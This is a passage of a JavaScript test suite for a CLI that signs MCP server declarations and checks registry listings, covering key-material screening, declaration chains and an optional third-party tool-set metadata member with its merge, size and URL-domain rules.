  const code = await main(['check-listing', NAME, '--registry', 'https://registry.example.com/Organizations/AcmeCorporation2024/Mirror', '--now', NOW], { stdout: { write: () => {} }, stderr: { write: (s) => (stderr += s) }, env: {}, deps: { httpsRequest: offline, keysFromHttp: async () => ({ keys: [], notes: [] }), keysFromDns: async () => ({ keys: [], notes: [] }), dnsResolverFor: () => ({}) } });
  assert.equal(code, LISTING_STATES.registry_unreachable, stderr);
  assert.doesNotMatch(stderr, /key material/);
  assert.equal(asked.length, 1);
  const keylike = fs.readFileSync(new URL('../lib/keylike.js', import.meta.url), 'utf8');
  assert.match(keylike, /best effort courtesy for those common\s+\/\/ forms, not a complete filter/);
  assert.match(keylike, /Known gaps/);
  const readme = fs.readFileSync(new URL('../README.md', import.meta.url), 'utf8').replace(/\s+/g, ' ');
  assert.match(readme, /This check is a best effort courtesy for the common pasted forms, not a complete filter/);
});

test('recheck C: check-listing screens a server name by the rule prepare uses, before any request', async () => {
  const hexKey = k.hex;
  const name = `com.example/${hexKey.slice(0, 32)}-${hexKey.slice(32)}`;
  for (const command of ['check-listing', 'prepare']) {
    const args = command === 'prepare' ? [name, '--for-version', '1.0.1', '--out', freshOut()] : [name];
    await scenario({ registry: baseRegistry(), site: baseSite() }, args, (r, w) => {
      assert.equal(r.code, 1, `${command}: ${r.stdout}${r.stderr}`);
      assert.match(r.stderr, /the server name looks like key material/);
      assert.equal(w.seen.length, 0, 'no request was made');
      assert.ok(!r.stderr.includes(hexKey.slice(0, 20)));
      assertNoSecrets(r.stdout, r.stderr);
    }, { command });
  }
  assert.equal(nameHoldsKey(name), true);
  // A long ordinary name and one 40 digit hex run reach the registry in check-listing too.
  for (const ok of ['com.example/Weather.Forecast.Server2024.Production.Edition.EuropeWest3', 'com.example/build-0123456789abcdef0123456789abcdef01234567']) {
    const w = await world({ registry: baseRegistry(), site: baseSite() });
    try {
      const r = await w.run([ok, '--registry', w.registryUrl, '--now', NOW], { command: 'check-listing' });
      assert.equal(r.code, LISTING_STATES.registry_not_found, r.stdout + r.stderr);
      assert.ok(w.seen.length > 0);
    } finally {
      await w.close();
    }
  }
});

test('recheck D: output_folder_not_empty says only that nothing was written, also when the folder changes after the reads', async () => {
  // At the start: no request.
  const out = freshOut();
  fs.mkdirSync(out, { recursive: true });
  fs.writeFileSync(path.join(out, 'mine.txt'), 'x');
  await scenario({ registry: baseRegistry(), site: baseSite() }, [NAME, '--for-version', '1.1.0', '--out', out], (r, w) => {
    assert.equal(r.code, 32, r.stdout + r.stderr);
    assert.equal(r.stdout.split('\n')[1], '  the output folder cannot be written into as it is; nothing was written');
    assert.equal(w.seen.length, 0);
  });
  // At commit time: a file appears in the folder while prepare reads the tool list.
  const out2 = freshOut();
  const sneaky = (req, res, body) => {
    fs.mkdirSync(out2, { recursive: true });
    fs.writeFileSync(path.join(out2, 'appeared.txt'), 'x');
    return mcpServer()(req, res, body);
  };
  await scenario({ registry: baseRegistry(), site: baseSite({ [`POST ${HOST}/mcp`]: sneaky }) }, [NAME, '--for-version', '1.1.0', '--out', out2], (r, w) => {
    assert.equal(r.code, 32, r.stdout + r.stderr);
    assert.ok(w.seen.length > 0, 'reads were made before the refusal');
    assert.doesNotMatch(r.stdout, /nothing was read/);
    assert.match(r.stdout, /nothing was written/);
  });
  assert.deepEqual(filesUnder(out2), ['appeared.txt']);
  const row = fs.readFileSync(new URL('../README.md', import.meta.url), 'utf8').split(/\r?\n/).find((l) => l.startsWith('| 32 | `output_folder_not_empty` |'));
  assert.ok(row && !/nothing was read/.test(row) && /nothing was written/.test(row), row);
});

test('round 3: an unreadable older file does not stop a run that the other walk settles', async () => {
  // The listing names d4, which follows d3 and d2; latest.json = d2 is two
  // links behind it. The file before d2 (d1) answers 403: the walk back from
  // latest.json meets it, but the walk from d4 settles the question.
  const d4 = signDeclaration({ ...JSON.parse(text(d3)), signature: undefined, issuedAt: '2026-11-18T13:00:00Z', previous: declarationHash(d3) }, k.loaded);
  const site = { [latestRoute]: { body: text(d2) }, [byHashRoute(d4)]: { body: text(d4) }, [byHashRoute(d3)]: { body: text(d3) }, [byHashRoute(d1)]: { status: 403, body: 'no' } };
  await scenario({ registry: pointerRegistry(d4), site: baseSite(site) }, [NAME, '--for-version', '1.0.1', '--key-env', 'MCP_PRIVATE_KEY', '--out', freshOut(), '--json'], (r) => {
    assert.equal(r.code, 0, r.stdout + r.stderr);
    assert.equal(r.json.previous.hash, declarationHash(d4));
    assert.equal(r.json.previous.ancestry.relation, 'named_follows');
  }, { env: ENV });
});

test('round 3: check-listing still reads a long name of mixed case words, and the stop headline fits a fork', async () => {
  for (const ok of ['com.example/mcp-server-for-Kubernetes-cluster-ops-v2-beta-Edition', 'com.example/weather_forecast_server_for_Europe_and_Asia_2']) {
    const w = await world({ registry: baseRegistry(), site: baseSite() });
    try {
      const r = await w.run([ok, '--registry', w.registryUrl, '--now', NOW], { command: 'check-listing' });
      assert.equal(r.code, LISTING_STATES.registry_not_found, r.stdout + r.stderr);
    } finally {
      await w.close();
    }
  }
  assert.match(HELP_PREPARE, /neither follows nor precedes latest\.json/);
});


// --histor-tool-sets: the member HISTOR, a third party watcher, reads from the
// publisher metadata (lib/histor-tool-sets.js), next to the signed pointer.

const HM = 'dev.modelmarket.histor/tool-sets';
const HISTOR_SET = { mtl: '1', sets: [{ digest: tsd.contract.digest, count: TOOLS.tools.length }] };
const OTHER_DIGEST = 'sha256-' + 'A'.repeat(43) + '=';
const plainText = (s) => s.replace(/--[a-z]/g, '').replace(/https?:\/\/\S+/g, '');

test('--histor-tool-sets off: pointer.json, --json and NEXT_STEPS are as before, and a listing member of that name is carried as it is', async () => {
  const out = freshOut();
  const listed = { tier: 'free', [HM]: { mtl: '1', sets: [{ digest: OTHER_DIGEST }] } };
  await scenario({ registry: baseRegistry({ [regPath()]: { body: listingFor({ meta: { [PP]: listed } }) } }), site: baseSite() }, [NAME, '--for-version', '1.0.1', '--key-env', 'MCP_PRIVATE_KEY', '--out', out, '--json'], (r) => {
    assert.equal(r.code, 0, r.stdout + r.stderr);
    assert.ok(!Object.hasOwn(r.json, 'historToolSets'), 'no new member in --json without the option');
    assert.deepEqual(Object.keys(r.json.pointer.meta[PP]), ['tier', HM, 'addonDeclaration']);
    assert.deepEqual(r.json.pointer.meta[PP][HM], listed[HM], 'carried unchanged');
    assert.deepEqual(r.json.pointer.carried, ['tier', HM]);
    assert.ok(!r.json.steps.some((s) => s.line.includes(HM)));
  }, { env: ENV });
  assert.ok(!readOut(out, 'NEXT_STEPS.txt').includes('HISTOR'));
});

test('--histor-tool-sets on: pointer.json carries the member next to the pointer, step 9 checks it, and check-listing reports it for information', async () => {
  const out = freshOut();
  let json;
  await scenario({ registry: baseRegistry(), site: baseSite() }, [NAME, '--for-version', '1.0.1', '--key-env', 'MCP_PRIVATE_KEY', '--out', out, '--histor-tool-sets', '--json'], (r) => {
    assert.equal(r.code, 0, r.stdout + r.stderr);
    json = r.json;
    assertNoSecrets(r.stdout, r.stderr);
  }, { env: ENV });
  const signed = JSON.parse(readOut(out, `site/.well-known/addon-declaration/${NAME}/latest.json`));
  const pointer = JSON.parse(readOut(out, 'pointer.json'));
  assert.deepEqual(pointer, { _meta: { [PP]: { addonDeclaration: { url: `https://${HOST}${folder}by-hash/${hex(signed)}.json`, hash: declarationHash(signed) }, [HM]: HISTOR_SET } } });
  assert.equal(pointer._meta[PP][HM].sets[0].digest, signed.toolSetDigest.contract, 'the digest the declaration signs');
  assert.equal(json.historToolSets.check, 'passed');
  assert.deepEqual(json.historToolSets.problems, []);
  assert.deepEqual(json.historToolSets.value, HISTOR_SET);
  assert.equal(json.historToolSets.existing, null);
  assert.equal(json.historToolSets.toolCount, 2);
  assert.equal(json.historToolSets.watcher, 'https://histor.modelmarket.dev');
  assert.equal(json.pointer.bytes, Buffer.byteLength(JSON.stringify(pointer._meta[PP])));
  assert.match(json.steps.find((s) => s.step === 8).line, /pointer\.json \(\d+ of 4096 bytes, with the "dev\.modelmarket\.histor\/tool-sets" member\)/);
  assert.ok(json.steps.find((s) => s.step === 9).line.includes(`the "${HM}" member in pointer.json names ${tsd.contract.digest}, equal to the contract digest the declaration signs, with the count of 2 tools signed (the member itself is not signed)`));
  // The declaration itself has the members a run without the option signs.
  assert.deepEqual(Object.keys(signed), ['spec', 'name', 'version', 'toolSetDigest', 'remotes', 'issuedAt', 'expiresAt', 'key', 'signature']);
  const next = readOut(out, 'NEXT_STEPS.txt');
  assert.match(next, /HISTOR, a third party watcher of MCP servers \(https:\/\/histor\.modelmarket\.dev\)/);
  assert.match(next, /The member is not signed and is not part of the declaration: it is a statement by the publisher/);
  assert.match(next, /The signed declaration is what shows who made the statement about the tool list/);
  assert.ok(next.includes(tsd.contract.digest));
  assert.ok(!/\s-\s|\s--\s|[‒-―−]/.test(plainText(next)), 'no dash punctuation');
  assert.ok(!/\b(never|guaranteed|safe|secure|trusted|consultant)\b/i.test(next), 'no barred word');

  // After the upload and the publication: check-listing reads the member for information only.
  const newListing = listingFor({ version: '1.0.1' });
  newListing.server._meta = pointer._meta;
  const w2 = await world({ registry: { [regPath('1.0.1')]: { body: newListing } }, site: uploadedSite(out, { [`POST ${HOST}/mcp`]: mcpServer() }) });
  try {
    const c = await w2.run([NAME, '--version', '1.0.1', '--registry', w2.registryUrl, '--fetch-tools', '--now', NOW], { command: 'check-listing' });
    assert.equal(c.code, 0, c.stdout + c.stderr);
    assert.match(c.stdout, /^verified: /);
    assert.match(c.stdout, /\n {2}dev\.modelmarket\.histor\/tool-sets \(for information, not part of this check\): 1 set HISTOR takes; its digests equal the contract digest of the declaration in force\n/);
    const j = await w2.run([NAME, '--version', '1.0.1', '--registry', w2.registryUrl, '--now', NOW, '--json'], { command: 'check-listing' });
    assert.equal(j.json.historToolSets.matches, 'all');
    assert.equal(j.json.historToolSets.comparedWith, declarationHash(signed));
    assert.deepEqual(j.json.historToolSets.digests, [tsd.contract.digest]);
  } finally {
    await w2.close();
  }
  // A member whose digest differs changes no state of check-listing.
  const changed = listingFor({ version: '1.0.1' });
  changed.server._meta = { [PP]: { ...pointer._meta[PP], [HM]: { mtl: '1', sets: [{ digest: OTHER_DIGEST }] } } };
  const w3 = await world({ registry: { [regPath('1.0.1')]: { body: changed } }, site: uploadedSite(out) });
  try {
    const c = await w3.run([NAME, '--version', '1.0.1', '--registry', w3.registryUrl, '--now', NOW, '--json'], { command: 'check-listing' });
    assert.equal(c.code, 0, c.stdout + c.stderr);
    assert.equal(c.json.state, 'verified');
    assert.equal(c.json.historToolSets.matches, 'none');
    const t = await w3.run([NAME, '--version', '1.0.1', '--registry', w3.registryUrl, '--now', NOW], { command: 'check-listing' });
    assert.equal(t.code, 0);
    assert.match(t.stdout, /tool-sets \(for information, not part of this check\): 1 set HISTOR takes; none of its digests equals the contract digest of the declaration in force/);
  } finally {
    await w3.close();
  }
  // A listing without the member: null in --json, and no line.
  const bare = listingFor({ version: '1.0.1' });
  bare.server._meta = { [PP]: { addonDeclaration: pointer._meta[PP].addonDeclaration } };
  const w4 = await world({ registry: { [regPath('1.0.1')]: { body: bare } }, site: uploadedSite(out) });
  try {
    const c = await w4.run([NAME, '--version', '1.0.1', '--registry', w4.registryUrl, '--now', NOW, '--json'], { command: 'check-listing' });
    assert.equal(c.code, 0, c.stdout + c.stderr);
    assert.equal(c.json.historToolSets, null);
    const t = await w4.run([NAME, '--version', '1.0.1', '--registry', w4.registryUrl, '--now', NOW], { command: 'check-listing' });
    assert.ok(!t.stdout.includes(HM));
  } finally {
    await w4.close();
  }
});

test('--histor-tool-sets merges into a member of that name in the listing: its other sets, their when and its url are kept, so HISTOR withdraws none', async () => {
  const D2 = 'sha256-' + 'B'.repeat(43) + '=';
  const listed = {
    tier: 'free',
    [HM]: {
      mtl: '1',
      sets: [
        { digest: OTHER_DIGEST, count: 9, when: 'the runner is installed' },
        { digest: tsd.contract.digest, count: 1, when: 'a key is set' },
        { digest: 'sha256:' + 'ab'.repeat(32) },
        { digest: D2 },
        { digest: OTHER_DIGEST },
      ],
      url: 'https://example.com/.well-known/mcp-tool-sets.json',
      note: 'kept by nobody',
    },
  };
  const out = freshOut();
  await scenario({ registry: baseRegistry({ [regPath()]: { body: listingFor({ meta: { [PP]: listed } }) } }), site: baseSite() }, [NAME, '--for-version', '1.0.1', '--key-env', 'MCP_PRIVATE_KEY', '--out', out, '--histor-tool-sets', '--json'], (r) => {
    assert.equal(r.code, 0, r.stdout + r.stderr);
    assert.deepEqual(Object.keys(r.json.pointer.meta[PP]), ['tier', HM, 'addonDeclaration']);
    assert.deepEqual(r.json.pointer.meta[PP][HM], {
      mtl: '1',
      sets: [
        { digest: tsd.contract.digest, count: 2, when: 'a key is set' },
        { digest: OTHER_DIGEST, count: 9, when: 'the runner is installed' },
        { digest: D2 },
      ],
      url: 'https://example.com/.well-known/mcp-tool-sets.json',
    }, 'the set signed here first, every other set HISTOR reads and the url kept');
    assert.deepEqual(r.json.pointer.carried, ['tier']);
    assert.equal(r.json.historToolSets.check, 'passed');
    assert.deepEqual(r.json.historToolSets.existing, {
      source: 'the listing of 1.0.0',
      action: 'merged',
      keptSets: [OTHER_DIGEST, D2],
      keptWhen: true,
      keptUrl: 'https://example.com/.well-known/mcp-tool-sets.json',
      urlRefused: null,
      leftOut: [
        'the member "note", which HISTOR does not read',
        'sets[2]: digest is not an MTL/1 tool-set digest (sha256-<base64>) (HISTOR skips it too)',
        'sets[4]: the same digest twice (HISTOR skips it too)',
      ],
    });
    assert.ok(r.json.notes.includes(`the listing of 1.0.0 already has a "${HM}" member; pointer.json merges the set signed here into it as its first set (--histor-tool-sets) and keeps the 2 other sets HISTOR reads from it (${OTHER_DIGEST}, ${D2}) and its "url", with the "when" it gives for the digest signed here, so HISTOR marks none of them withdrawn`), r.json.notes.join('\n'));
    assert.ok(r.json.notes.some((n) => n.startsWith('pointer.json leaves out what HISTOR does not read from that member: the member "note"')));
    assert.ok(r.json.steps.find((s) => s.step === 9).line.includes(', and keeps 2 other sets from the listing of 1.0.0 (the member itself is not signed)'));
  }, { env: ENV });
  const next = readOut(out, 'NEXT_STEPS.txt');
  assert.match(next, /it is the member of that name in the listing of 1\.0\.0 with this set added first/);
  assert.match(next, /It also keeps the 2 other sets that member declares and its "url", and the "when" that member gives for this digest, so HISTOR marks none of them withdrawn\./);
  assert.match(next, /HISTOR uses the member for tool sets it has not observed itself/);
  assert.ok(!/\s-\s|\s--\s|[‒-―−]/.test(plainText(next)), 'no dash punctuation');
  assert.ok(!/\b(never|guaranteed|safe|secure|trusted|consultant)\b/i.test(next), 'no barred word');

  // A url HISTOR does not read is kept as it is, with a note that says why.
  const offDomain = { [HM]: { mtl: '1', url: 'https://other.example.net/sets.json' } };
  await scenario({ registry: baseRegistry({ [regPath()]: { body: listingFor({ meta: { [PP]: offDomain } }) } }), site: baseSite() }, [NAME, '--for-version', '1.0.1', '--key-env', 'MCP_PRIVATE_KEY', '--out', freshOut(), '--histor-tool-sets', '--json'], (r) => {
    assert.equal(r.code, 0, r.stdout + r.stderr);
    assert.deepEqual(r.json.pointer.meta[PP][HM], { ...HISTOR_SET, url: 'https://other.example.net/sets.json' });
    assert.equal(r.json.historToolSets.existing.urlRefused, '"url" must be on example.com or a subdomain, the domain the registry verified for com.example');
    assert.ok(r.json.notes.some((n) => n.startsWith('the "url" of that member is kept as it is, although HISTOR does not read it: "url" must be on example.com')));
  }, { env: ENV });

  // A member HISTOR reads nothing from is replaced, with a note that says why.
  const sj = path.join(tmp, 'server-histor.json');
  fs.writeFileSync(sj, JSON.stringify({ name: NAME, version: '1.0.1', remotes: [{ type: 'streamable-http', url: REMOTE }], _meta: { [PP]: { [HM]: 'not an object' } } }));
  const out2 = freshOut();
  await scenario({ registry: baseRegistry(), site: baseSite() }, [NAME, '--for-version', '1.0.1', '--server-json', sj, '--key-env', 'MCP_PRIVATE_KEY', '--out', out2, '--histor-tool-sets'], (r) => {
    assert.equal(r.code, 0, r.stdout + r.stderr);
    assert.match(r.stdout, /note: the server\.json given already has a "dev\.modelmarket\.histor\/tool-sets" member; it is not a JSON object, so HISTOR reads nothing from it, and pointer\.json replaces it/);
  }, { env: ENV });
  assert.deepEqual(JSON.parse(readOut(out2, 'pointer.json'))._meta[PP][HM], HISTOR_SET);
  assert.match(readOut(out2, 'NEXT_STEPS.txt'), /it replaces the member of that name in the server\.json given, which HISTOR reads nothing from/);
  fs.writeFileSync(sj, JSON.stringify({ name: NAME, version: '1.0.1', remotes: [{ type: 'streamable-http', url: REMOTE }], _meta: { [PP]: { [HM]: { mtl: 1, sets: [{ digest: OTHER_DIGEST }] } } } }));
  await scenario({ registry: baseRegistry(), site: baseSite() }, [NAME, '--for-version', '1.0.1', '--server-json', sj, '--out', freshOut(), '--histor-tool-sets', '--dry-run', '--json'], (r) => {
    assert.equal(r.code, 0, r.stdout + r.stderr);
    assert.deepEqual(r.json.pointer.meta[PP][HM], HISTOR_SET);
    assert.equal(r.json.historToolSets.existing.action, 'replaced');
    assert.ok(r.json.notes.includes(`the server.json given already has a "${HM}" member; its "mtl" is not "1", so HISTOR reads nothing from it, and pointer.json would replace it with the one built from the tool list signed here (--histor-tool-sets)`), r.json.notes.join('\n'));
  });
});

test('--histor-tool-sets: a member with 8 other sets HISTOR reads stops the run before signing, naming the sets that would be dropped', async () => {
  const eight = Array.from({ length: 8 }, (_, i) => ({ digest: `sha256-${String.fromCharCode(66 + i).repeat(43)}=`, ...(i === 7 ? { when: 'on arm64' } : {}) }));
  const listed = { [HM]: { mtl: '1', sets: eight, url: 'https://example.com/s.json' } };
  for (const extra of [['--key-env', 'MCP_PRIVATE_KEY'], ['--dry-run']]) {
    const out = freshOut();
    await scenario({ registry: baseRegistry({ [regPath()]: { body: listingFor({ meta: { [PP]: listed } }) } }), site: baseSite() }, [NAME, '--for-version', '1.0.1', '--out', out, '--histor-tool-sets', ...extra], (r) => {
      assert.equal(r.code, 1, r.stdout + r.stderr);
      assert.match(r.stderr, /--histor-tool-sets: the listing of 1\.0\.0 already has a "dev\.modelmarket\.histor\/tool-sets" member with 8 sets HISTOR reads, and HISTOR reads at most 8 there\. Adding the set signed here would drop these sets, which HISTOR would then mark withdrawn:/);
      assert.ok(r.stderr.includes(`${eight[7].digest} (when: "on arm64")`), r.stderr);
      assert.match(r.stderr, /nothing was signed or written/);
    }, { env: ENV });
    assert.deepEqual(filesUnder(out), []);
  }
  // Seven fit: the run goes on, and the member holds 8 sets.
  const seven = { [HM]: { mtl: '1', sets: eight.slice(0, 7) } };
  await scenario({ registry: baseRegistry({ [regPath()]: { body: listingFor({ meta: { [PP]: seven } }) } }), site: baseSite() }, [NAME, '--for-version', '1.0.1', '--key-env', 'MCP_PRIVATE_KEY', '--out', freshOut(), '--histor-tool-sets', '--json'], (r) => {
    assert.equal(r.code, 0, r.stdout + r.stderr);
    assert.equal(r.json.pointer.meta[PP][HM].sets.length, 8);
    assert.equal(r.json.historToolSets.check, 'passed');
  }, { env: ENV });
});

test('histor-tool-sets.js: what check-listing reports is what HISTOR takes (parse_sets and url_refusal)', async () => {
  const H = await import('../lib/histor-tool-sets.js');
  const hex = H.readHistorMember({ mtl: '1', sets: [{ digest: 'sha256:' + 'ab'.repeat(32) }] }, NAME);
  assert.equal(hex.readable, false, 'a digest in the hex form is not read by HISTOR');
  assert.deepEqual(hex.digests, []);
  assert.match(hex.problem, /HISTOR takes no set and no url from it: sets\[0\]: digest is not an MTL\/1 tool-set digest/);
  const evil = H.readHistorMember({ mtl: '1', url: 'https://evil.example/x.json' }, NAME);
  assert.equal(evil.readable, false);
  assert.equal(evil.urlRefused, '"url" must be on example.com or a subdomain, the domain the registry verified for com.example');
  const twelve = H.readHistorMember({ mtl: '1', sets: Array.from({ length: 12 }, () => ({ digest: tsd.contract.digest })) }, NAME);
  assert.equal(twelve.sets, 1);
  assert.deepEqual(twelve.digests, [tsd.contract.digest]);
  assert.equal(twelve.skipped.length, 11);
  const many = H.readHistorMember({ mtl: '1', sets: Array.from({ length: 10 }, (_, i) => ({ digest: `sha256-${String.fromCharCode(66 + i).repeat(43)}=` })) }, NAME);
  assert.equal(many.sets, 8);
  assert.deepEqual(many.skipped, ['sets[8:]: more than 8 sets']);
  for (const count of [true, -1, 5001, 1.5, '2']) {
    assert.equal(H.readHistorMember({ mtl: '1', sets: [{ digest: tsd.contract.digest, count }] }, NAME).readable, false, `count ${JSON.stringify(count)}`);
  }
  assert.equal(H.readHistorMember({ mtl: '1', sets: [{ digest: tsd.contract.digest, count: null }] }, NAME).sets, 1, 'a null count is no count');
  assert.equal(H.readHistorMember({ mtl: '1', sets: [] }, NAME).readable, false);
  // url_refusal
  const R = H.historUrlRefusal;
  assert.equal(R('https://example.com/.well-known/mcp-tool-sets.json', NAME), null);
  assert.equal(R('https://sets.example.com/a.json', NAME), null);
  assert.equal(R('https://example.com:443/a.json', NAME), null);
  assert.match(R('https://notexample.com/a.json', NAME), /must be on example\.com or a subdomain/);
  assert.match(R('http://example.com/a.json', NAME), /must be https/);
  assert.match(R('https://u:p@example.com/a.json', NAME), /credentials/);
  assert.match(R('https://example.com:8443/a.json', NAME), /default https port/);
  assert.match(R(42, NAME), /must be an https URL/);
  assert.equal(R('https://alice.github.io/sets.json', 'io.github.alice/srv'), null);
  assert.equal(R('https://raw.githubusercontent.com/alice/repo/main/sets.json', 'io.github.alice/srv'), null);
  assert.match(R('https://raw.githubusercontent.com/bob/repo/main/sets.json', 'io.github.alice/srv'), /under \/alice\//);
  assert.match(R('https://example.com/a.json', 'localhost/x'), /no domain HISTOR can bind/);
});

test('histor-tool-sets.js: the merge keeps what HISTOR reads, and the self check covers count, members, order and carried sets', async () => {
  const H = await import('../lib/histor-tool-sets.js');
  const digests = { spec: 'mcp-tool-set-digest/1', contract: tsd.contract.digest, extras: tsd.extras.digest };
  const built = { mtl: '1', sets: [{ digest: tsd.contract.digest, count: 2 }] };
  assert.equal(H.mergeHistorMember(built, undefined, NAME).action, 'added');
  const m = H.mergeHistorMember(built, { mtl: '1', sets: [{ digest: OTHER_DIGEST, when: 'w' }], url: 'https://example.com/s.json' }, NAME);
  assert.deepEqual(m.value, { mtl: '1', sets: [{ digest: tsd.contract.digest, count: 2 }, { digest: OTHER_DIGEST, when: 'w' }], url: 'https://example.com/s.json' });
  assert.deepEqual(built.sets[0], { digest: tsd.contract.digest, count: 2 }, 'the built member is not changed');
  assert.deepEqual(H.historMemberProblems(m.value, digests, 2, m.carried), []);
  assert.ok(H.historMemberProblems(m.value, digests, 2).some((p) => /neither the contract digest/.test(p)), 'a set not carried is refused');
  assert.ok(H.historMemberProblems(m.value, digests, 2, { digests: [OTHER_DIGEST], url: 'https://example.com/other.json' }).some((p) => /"url" is not the one carried/.test(p)));
  assert.ok(H.historMemberProblems({ mtl: '1', sets: [{ digest: OTHER_DIGEST }, { digest: tsd.contract.digest, count: 2 }] }, digests, 2, { digests: [OTHER_DIGEST] }).some((p) => /sets\[0\]\.digest is/.test(p)), 'the signed set comes first');
  assert.ok(H.historMemberProblems({ mtl: '1', sets: [{ digest: tsd.contract.digest, count: true }] }, digests, 2).some((p) => /count is true, not an integer from 0 to 5000/.test(p)));
  assert.ok(H.historMemberProblems({ mtl: '1', sets: [{ digest: tsd.contract.digest }], extra: 1 }, digests, 2).some((p) => /the member "extra", which HISTOR does not read/.test(p)));
  assert.ok(H.historMemberProblems({ mtl: '1', sets: [{ digest: tsd.contract.digest }, { digest: tsd.contract.digest }] }, digests, 2).some((p) => /same digest as an earlier set/.test(p)));
  const full = H.mergeHistorMember(built, { mtl: '1', sets: Array.from({ length: 8 }, (_, i) => ({ digest: `sha256-${String.fromCharCode(66 + i).repeat(43)}=` })) }, NAME);
  assert.equal(full.overflow.length, 1);
  assert.equal(full.value.sets.length, 8);
  const same = H.mergeHistorMember(built, { mtl: '1', sets: [{ digest: tsd.contract.digest, count: 7 }] }, NAME);
  assert.deepEqual(same.value, built, 'a set with the digest signed here gives way to it');
  assert.deepEqual(same.keptSets, []);
});

test('check-listing: the HISTOR line says why nothing was compared when the check stopped before a declaration verified', async () => {
  const out = freshOut();
  await scenario({ registry: baseRegistry(), site: baseSite() }, [NAME, '--for-version', '1.0.1', '--key-env', 'MCP_PRIVATE_KEY', '--out', out, '--histor-tool-sets'], (r) => assert.equal(r.code, 0, r.stdout + r.stderr), { env: ENV });
  const pointer = JSON.parse(readOut(out, 'pointer.json'));
  const listing = listingFor({ version: '1.0.1' });
  listing.server._meta = pointer._meta;
  const w = await world({ registry: { [regPath('1.0.1')]: { body: listing } }, site: uploadedSite(out) });
  try {
    // Long after the declaration expired.
    const j = await w.run([NAME, '--version', '1.0.1', '--registry', w.registryUrl, '--now', '2030-01-01T00:00:00Z', '--json'], { command: 'check-listing' });
    assert.notEqual(j.json.state, 'verified');
    assert.equal(j.json.historToolSets.matches, null);
    assert.equal(j.json.historToolSets.notCompared, `the check stopped at ${j.json.state}, before a declaration in force verified`);
    const t = await w.run([NAME, '--version', '1.0.1', '--registry', w.registryUrl, '--now', '2030-01-01T00:00:00Z'], { command: 'check-listing' });
    assert.ok(t.stdout.includes(`1 set HISTOR takes; not compared (the check stopped at ${j.json.state}, before a declaration in force verified)`), t.stdout);
  } finally {
    await w.close();
  }
  // A member whose only digest is in the hex form: HISTOR reads nothing from it.
  const hexListing = listingFor({ version: '1.0.1' });
  hexListing.server._meta = { [PP]: { ...pointer._meta[PP], [HM]: { mtl: '1', sets: [{ digest: 'sha256:' + 'ab'.repeat(32) }] } } };
  const w2 = await world({ registry: { [regPath('1.0.1')]: { body: hexListing } }, site: uploadedSite(out) });
  try {
    const t = await w2.run([NAME, '--version', '1.0.1', '--registry', w2.registryUrl, '--now', NOW, '--json'], { command: 'check-listing' });
    assert.equal(t.json.state, 'verified');
    assert.equal(t.json.historToolSets.readable, false);
    assert.equal(t.json.historToolSets.notCompared, 'it names no digest in the form HISTOR reads');
    const x = await w2.run([NAME, '--version', '1.0.1', '--registry', w2.registryUrl, '--now', NOW], { command: 'check-listing' });
    assert.match(x.stdout, /tool-sets \(for information, not part of this check\): present, but HISTOR reads nothing from it \(HISTOR takes no set and no url from it: sets\[0\]: digest is not an MTL\/1 tool-set digest/);
  } finally {
    await w2.close();
  }
});

test('prepare --help: the --histor-tool-sets paragraph wraps like the other lines and says the check runs when the declaration is signed', () => {
  const lines = HELP_PREPARE.split('\n');
  const at = lines.findIndex((l) => l.trimStart().startsWith('--histor-tool-sets (pointer mode only'));
  assert.ok(at > 0);
  const para = [];
  for (let i = at; i < lines.length && lines[i].startsWith('      '); i++) para.push(lines[i]);
  assert.ok(para.length > 3);
  for (const l of para.slice(0, -1)) assert.ok(l.length >= 62 && l.length <= 76, `uneven line (${l.length}): ${l}`);
  assert.match(para.join(' ').replace(/\s+/g, ' '), /When the declaration is signed, the check step confirms that its digest equals the declaration's contract digest\./);
  assert.match(para.join(' ').replace(/\s+/g, ' '), /HISTOR uses the member for tool sets it has not observed itself/);
});

test('--histor-tool-sets: the limit of 4096 bytes covers the whole block, the member included', async () => {
  // A block that fits without the member and does not fit with it.
  const pointerOnly = Buffer.byteLength(JSON.stringify({ notes: '', addonDeclaration: { url: `https://${HOST}${folder}by-hash/${'0'.repeat(64)}.json`, hash: `sha256:${'0'.repeat(64)}` } }));
  const fill = 4096 - pointerOnly - 10;
  const sj = path.join(tmp, 'server-near-limit.json');
  fs.writeFileSync(sj, JSON.stringify({ name: NAME, version: '1.0.1', remotes: [{ type: 'streamable-http', url: REMOTE }], _meta: { [PP]: { notes: 'x'.repeat(fill) } } }));
  await scenario({ registry: baseRegistry(), site: baseSite() }, [NAME, '--for-version', '1.0.1', '--server-json', sj, '--out', freshOut(), '--json'], (r) => {
    assert.equal(r.code, 0, r.stdout + r.stderr);
    assert.equal(r.json.pointer.bytes, 4086);
  });
  for (const keyArgs of [['--key-env', 'MCP_PRIVATE_KEY'], [], ['--dry-run']]) {
    const out = freshOut();
    await scenario({ registry: baseRegistry(), site: baseSite() }, [NAME, '--for-version', '1.0.1', '--server-json', sj, '--out', out, '--histor-tool-sets', ...keyArgs], (r) => {
      assert.equal(r.code, PREPARE_STATES.pointer_too_large, r.stdout + r.stderr);
      assert.match(r.stdout, /^pointer_too_large: /);
      assert.match(r.stdout, /at most 4096 bytes/);
      assert.match(r.stdout, /the "dev\.modelmarket\.histor\/tool-sets" member \(--histor-tool-sets\) about \d+ bytes, and the block carries 1 other member of the server\.json given; make them smaller or move them out, or leave out --histor-tool-sets/);
    }, { env: ENV });
    assert.deepEqual(filesUnder(out), []);
  }
});

test('--histor-tool-sets: usage errors are reported before any request', async () => {
  await scenario({ registry: baseRegistry(), site: baseSite() }, [NAME, '--for-version', '1.0.0', '--no-pointer', '--histor-tool-sets', '--key-env', 'MCP_PRIVATE_KEY', '--out', freshOut()], (r, w) => {
    assert.equal(r.code, 1, r.stdout + r.stderr);
    assert.match(r.stderr, /--histor-tool-sets cannot be given with --no-pointer/);
    assert.equal(w.seen.length, 0);
    assert.deepEqual(w.lookups, []);
  }, { env: ENV });
  // check-listing does not take it.
  const c = await cli(['check-listing', NAME, '--histor-tool-sets']);
  assert.equal(c.code, 1);
  assert.match(c.stderr, /--histor-tool-sets is not an option of check-listing/);
  // prepare() itself refuses the pair too, before any request.
  const { prepare } = await import('../lib/prepare.js');
  await assert.rejects(prepare({ name: NAME, registry: registryBase(DEFAULT_REGISTRY), forVersion: '1.0.0', noPointer: true, historToolSets: true, outDir: freshOut(), request: async () => assert.fail('no request'), keyLookup: async () => assert.fail('no lookup') }), /--histor-tool-sets cannot be given with --no-pointer/);
  assert.match(HELP_PREPARE, /--histor-tool-sets/);
